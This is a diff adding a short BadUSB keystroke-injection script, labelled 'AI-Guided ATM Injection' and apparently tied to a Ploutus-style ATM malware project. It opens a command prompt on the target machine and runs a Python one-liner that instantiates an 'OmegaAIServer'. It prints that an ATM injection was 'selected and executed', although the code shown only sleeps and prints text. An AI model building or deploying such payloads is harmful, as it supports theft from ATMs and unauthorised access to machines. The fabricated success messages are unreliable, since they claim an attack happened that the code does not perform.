@@ -1,0 +1,17 @@
+REM OMEGA BadUSB - AI-Guided ATM Injection
+REM AI-selected optimal ATM process injection
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING cd C:\Users\gucci\Desktop\OMEGA_PLOUTUS_X\ECOMEGA_X1
+ENTER
+STRING python -c "from omega_ai_server import OmegaAIServer; server = OmegaAIServer(); print('AI-guided ATM injection initiated'); import time; time.sleep(4); print('Optimal injection selected and executed')"
+ENTER
+DELAY 5000
+STRING AI-guided ATM injection completed
+ENTER
+REM AI selects optimal injection
